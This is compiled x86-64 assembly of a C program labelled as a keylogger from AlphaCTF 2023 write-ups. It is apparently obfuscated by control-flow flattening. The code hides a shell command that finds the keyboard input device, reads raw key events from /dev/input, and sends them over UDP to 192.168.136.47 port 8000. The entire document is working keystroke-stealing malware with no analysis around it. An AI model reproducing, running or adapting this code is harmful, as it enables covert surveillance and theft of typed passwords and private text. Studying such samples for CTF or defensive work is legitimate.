	.file	"cynex-k_AlphaCTF-2k23-WriteUps_keylogger_flatten.c"
	.text
	.globl	_TIG_IZ_uy6z_argc
	.bss
	.align 4
	.type	_TIG_IZ_uy6z_argc, @object
	.size	_TIG_IZ_uy6z_argc, 4
_TIG_IZ_uy6z_argc:
	.zero	4
	.globl	_TIG_IZ_uy6z_envp
	.align 8
	.type	_TIG_IZ_uy6z_envp, @object
	.size	_TIG_IZ_uy6z_envp, 8
_TIG_IZ_uy6z_envp:
	.zero	8
	.globl	_TIG_IZ_uy6z_argv
	.align 8
	.type	_TIG_IZ_uy6z_argv, @object
	.size	_TIG_IZ_uy6z_argv, 8
_TIG_IZ_uy6z_argv:
	.zero	8
	.section	.rodata
.LC0:
	.string	"Error sending data"
.LC1:
	.string	"Error reading from file"
.LC2:
	.string	"Error creating socket"
.LC3:
	.string	"Error opening file"
.LC4:
	.string	"192.168.136.47"
.LC5:
	.string	"\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB3:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$288, %rsp
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%rdx, -280(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	$0, _TIG_IZ_uy6z_envp(%rip)
	nop
.L2:
	movq	$0, _TIG_IZ_uy6z_argv(%rip)
	nop
.L3:
	movl	$0, _TIG_IZ_uy6z_argc(%rip)
	nop
	nop
.L4:
.L5:
#APP
# 102 "/usr/include/x86_64-linux-gnu/bits/byteswap.h" 1
	##_ANNOTATION_INITIALREGION_-TIG-IZ-uy6z--0
# 0 "" 2
#NO_APP
	movl	-260(%rbp), %eax
	movl	%eax, _TIG_IZ_uy6z_argc(%rip)
	movq	-272(%rbp), %rax
	movq	%rax, _TIG_IZ_uy6z_argv(%rip)
	movq	-280(%rbp), %rax
	movq	%rax, _TIG_IZ_uy6z_envp(%rip)
	nop
	movq	$8, -200(%rbp)
.L41:
	cmpq	$36, -200(%rbp)
	ja	.L43
	movq	-200(%rbp), %rax
	leaq	0(,%rax,4), %rdx
	leaq	.L8(%rip), %rax
	movl	(%rdx,%rax), %eax
	cltq
	leaq	.L8(%rip), %rdx
	addq	%rdx, %rax
	notrack jmp	*%rax
	.section	.rodata
	.align 4
	.align 4
.L8:
	.long	.L27-.L8
	.long	.L26-.L8
	.long	.L25-.L8
	.long	.L24-.L8
	.long	.L43-.L8
	.long	.L23-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L22-.L8
	.long	.L43-.L8
	.long	.L21-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L20-.L8
	.long	.L43-.L8
	.long	.L19-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L18-.L8
	.long	.L17-.L8
	.long	.L16-.L8
	.long	.L43-.L8
	.long	.L15-.L8
	.long	.L14-.L8
	.long	.L43-.L8
	.long	.L13-.L8
	.long	.L12-.L8
	.long	.L43-.L8
	.long	.L43-.L8
	.long	.L11-.L8
	.long	.L10-.L8
	.long	.L43-.L8
	.long	.L9-.L8
	.long	.L43-.L8
	.long	.L7-.L8
	.text
.L14:
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L20:
	movl	-232(%rbp), %eax
	cltq
	movzbl	-128(%rbp,%rax), %eax
	movb	%al, -245(%rbp)
	leaq	-176(%rbp), %rdx
	leaq	-245(%rbp), %rsi
	movl	-240(%rbp), %eax
	movl	$16, %r9d
	movq	%rdx, %r8
	movl	$0, %ecx
	movl	$1, %edx
	movl	%eax, %edi
	call	sendto@PLT
	movq	%rax, -208(%rbp)
	movq	$2, -200(%rbp)
	jmp	.L28
.L11:
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L22:
	movq	$21, -200(%rbp)
	jmp	.L28
.L26:
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L24:
	movl	$16, -232(%rbp)
	movq	$16, -200(%rbp)
	jmp	.L28
.L19:
	cmpl	$21, -232(%rbp)
	jg	.L29
	movq	$14, -200(%rbp)
	jmp	.L28
.L29:
	movq	$20, -200(%rbp)
	jmp	.L28
.L15:
	movq	-224(%rbp), %rax
	movq	%rax, %rdi
	call	free@PLT
	movl	$0, %edx
	movl	$2, %esi
	movl	$2, %edi
	call	socket@PLT
	movl	%eax, -240(%rbp)
	movq	$22, -200(%rbp)
	jmp	.L28
.L17:
	movb	$99, -96(%rbp)
	movb	$97, -95(%rbp)
	movb	$116, -94(%rbp)
	movb	$32, -93(%rbp)
	movb	$47, -92(%rbp)
	movb	$112, -91(%rbp)
	movb	$114, -90(%rbp)
	movb	$111, -89(%rbp)
	movb	$99, -88(%rbp)
	movb	$47, -87(%rbp)
	movb	$98, -86(%rbp)
	movb	$117, -85(%rbp)
	movb	$115, -84(%rbp)
	movb	$47, -83(%rbp)
	movb	$105, -82(%rbp)
	movb	$110, -81(%rbp)
	movb	$112, -80(%rbp)
	movb	$117, -79(%rbp)
	movb	$116, -78(%rbp)
	movb	$47, -77(%rbp)
	movb	$100, -76(%rbp)
	movb	$101, -75(%rbp)
	movb	$118, -74(%rbp)
	movb	$105, -73(%rbp)
	movb	$99, -72(%rbp)
	movb	$101, -71(%rbp)
	movb	$115, -70(%rbp)
	movb	$32, -69(%rbp)
	movb	$124, -68(%rbp)
	movb	$32, -67(%rbp)
	movb	$103, -66(%rbp)
	movb	$114, -65(%rbp)
	movb	$101, -64(%rbp)
	movb	$112, -63(%rbp)
	movb	$32, -62(%rbp)
	movb	$107, -61(%rbp)
	movb	$101, -60(%rbp)
	movb	$121, -59(%rbp)
	movb	$98, -58(%rbp)
	movb	$111, -57(%rbp)
	movb	$97, -56(%rbp)
	movb	$114, -55(%rbp)
	movb	$100, -54(%rbp)
	movb	$32, -53(%rbp)
	movb	$45, -52(%rbp)
	movb	$65, -51(%rbp)
	movb	$32, -50(%rbp)
	movb	$53, -49(%rbp)
	movb	$32, -48(%rbp)
	movb	$124, -47(%rbp)
	movb	$32, -46(%rbp)
	movb	$103, -45(%rbp)
	movb	$114, -44(%rbp)
	movb	$101, -43(%rbp)
	movb	$112, -42(%rbp)
	movb	$32, -41(%rbp)
	movb	$45, -40(%rbp)
	movb	$111, -39(%rbp)
	movb	$32, -38(%rbp)
	movb	$45, -37(%rbp)
	movb	$69, -36(%rbp)
	movb	$32, -35(%rbp)
	movb	$32, -34(%rbp)
	movb	$39, -33(%rbp)
	movb	$101, -32(%rbp)
	movb	$118, -31(%rbp)
	movb	$101, -30(%rbp)
	movb	$110, -29(%rbp)
	movb	$116, -28(%rbp)
	movb	$91, -27(%rbp)
	movb	$48, -26(%rbp)
	movb	$45, -25(%rbp)
	movb	$57, -24(%rbp)
	movb	$93, -23(%rbp)
	movb	$43, -22(%rbp)
	movb	$39, -21(%rbp)
	movb	$0, -20(%rbp)
	leaq	-96(%rbp), %rax
	movq	%rax, %rdi
	call	execute_command
	movq	%rax, -192(%rbp)
	movq	-192(%rbp), %rax
	movq	%rax, -224(%rbp)
	movb	$47, -160(%rbp)
	movb	$100, -159(%rbp)
	movb	$101, -158(%rbp)
	movb	$118, -157(%rbp)
	movb	$47, -156(%rbp)
	movb	$105, -155(%rbp)
	movb	$110, -154(%rbp)
	movb	$112, -153(%rbp)
	movb	$117, -152(%rbp)
	movb	$116, -151(%rbp)
	movb	$47, -150(%rbp)
	movb	$0, -149(%rbp)
	movl	$12, -236(%rbp)
	movq	$10, -200(%rbp)
	jmp	.L28
.L7:
	cmpq	$24, -216(%rbp)
	je	.L31
	movq	$31, -200(%rbp)
	jmp	.L28
.L31:
	movq	$3, -200(%rbp)
	jmp	.L28
.L10:
	movl	-236(%rbp), %eax
	movb	$0, -160(%rbp,%rax)
	addl	$1, -236(%rbp)
	movq	$10, -200(%rbp)
	jmp	.L28
.L13:
	cmpl	$0, -244(%rbp)
	jns	.L33
	movq	$34, -200(%rbp)
	jmp	.L28
.L33:
	movq	$24, -200(%rbp)
	jmp	.L28
.L9:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L16:
	cmpl	$0, -240(%rbp)
	jns	.L35
	movq	$1, -200(%rbp)
	jmp	.L28
.L35:
	movq	$28, -200(%rbp)
	jmp	.L28
.L12:
	movw	$2, -176(%rbp)
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	call	inet_addr@PLT
	movl	%eax, -172(%rbp)
	movl	$8000, %edi
	call	htons@PLT
	movw	%ax, -174(%rbp)
	movq	$20, -200(%rbp)
	jmp	.L28
.L23:
	addl	$1, -232(%rbp)
	movq	$16, -200(%rbp)
	jmp	.L28
.L21:
	cmpl	$18, -236(%rbp)
	jbe	.L37
	movq	$0, -200(%rbp)
	jmp	.L28
.L37:
	movq	$32, -200(%rbp)
	jmp	.L28
.L27:
	movq	-224(%rbp), %rdx
	leaq	-160(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcat@PLT
	leaq	-160(%rbp), %rax
	leaq	.LC5(%rip), %rdx
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcspn@PLT
	movq	%rax, -184(%rbp)
	movq	-184(%rbp), %rax
	movl	%eax, -228(%rbp)
	movl	-228(%rbp), %eax
	cltq
	movb	$0, -160(%rbp,%rax)
	leaq	-160(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -244(%rbp)
	movq	$27, -200(%rbp)
	jmp	.L28
.L25:
	cmpq	$0, -208(%rbp)
	jns	.L39
	movq	$25, -200(%rbp)
	jmp	.L28
.L39:
	movq	$5, -200(%rbp)
	jmp	.L28
.L18:
	leaq	-128(%rbp), %rcx
	movl	-244(%rbp), %eax
	movl	$24, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	movq	%rax, -216(%rbp)
	movq	$36, -200(%rbp)
	jmp	.L28
.L43:
	nop
.L28:
	jmp	.L41
	.cfi_endproc
.LFE3:
	.size	main, .-main
	.section	.rodata
.LC6:
	.string	"Failed to run command"
.LC7:
	.string	"r"
.LC8:
	.string	"Failed to allocate memory"
	.text
	.globl	execute_command
	.type	execute_command, @function
execute_command:
.LFB5:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$208, %rsp
	movq	%rdi, -200(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	$3, -168(%rbp)
.L67:
	cmpq	$15, -168(%rbp)
	ja	.L70
	movq	-168(%rbp), %rax
	leaq	0(,%rax,4), %rdx
	leaq	.L47(%rip), %rax
	movl	(%rdx,%rax), %eax
	cltq
	leaq	.L47(%rip), %rdx
	addq	%rdx, %rax
	notrack jmp	*%rax
	.section	.rodata
	.align 4
	.align 4
.L47:
	.long	.L70-.L47
	.long	.L58-.L47
	.long	.L57-.L47
	.long	.L56-.L47
	.long	.L55-.L47
	.long	.L54-.L47
	.long	.L70-.L47
	.long	.L70-.L47
	.long	.L53-.L47
	.long	.L52-.L47
	.long	.L51-.L47
	.long	.L50-.L47
	.long	.L49-.L47
	.long	.L48-.L47
	.long	.L70-.L47
	.long	.L46-.L47
	.text
.L55:
	movq	-192(%rbp), %rax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L68
	jmp	.L69
.L46:
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L49:
	movq	-184(%rbp), %rdx
	leaq	-144(%rbp), %rax
	movl	$128, %esi
	movq	%rax, %rdi
	call	fgets@PLT
	movq	%rax, -176(%rbp)
	movq	$2, -168(%rbp)
	jmp	.L60
.L53:
	movq	-184(%rbp), %rax
	movq	%rax, %rdi
	call	pclose@PLT
	movq	$4, -168(%rbp)
	jmp	.L60
.L58:
	movl	$4096, %edi
	call	malloc@PLT
	movq	%rax, -152(%rbp)
	movq	-152(%rbp), %rax
	movq	%rax, -192(%rbp)
	movq	$9, -168(%rbp)
	jmp	.L60
.L56:
	movq	$1, -168(%rbp)
	jmp	.L60
.L50:
	leaq	-144(%rbp), %rdx
	movq	-192(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcat@PLT
	movq	$12, -168(%rbp)
	jmp	.L60
.L52:
	cmpq	$0, -192(%rbp)
	jne	.L61
	movq	$10, -168(%rbp)
	jmp	.L60
.L61:
	movq	$5, -168(%rbp)
	jmp	.L60
.L48:
	cmpq	$0, -184(%rbp)
	jne	.L63
	movq	$15, -168(%rbp)
	jmp	.L60
.L63:
	movq	$12, -168(%rbp)
	jmp	.L60
.L54:
	movq	-192(%rbp), %rax
	movb	$0, (%rax)
	movq	-200(%rbp), %rax
	leaq	.LC7(%rip), %rdx
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	popen@PLT
	movq	%rax, -160(%rbp)
	movq	-160(%rbp), %rax
	movq	%rax, -184(%rbp)
	movq	$13, -168(%rbp)
	jmp	.L60
.L51:
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L57:
	cmpq	$0, -176(%rbp)
	je	.L65
	movq	$11, -168(%rbp)
	jmp	.L60
.L65:
	movq	$8, -168(%rbp)
	jmp	.L60
.L70:
	nop
.L60:
	jmp	.L67
.L69:
	call	__stack_chk_fail@PLT
.L68:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE5:
	.size	execute_command, .-execute_command
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
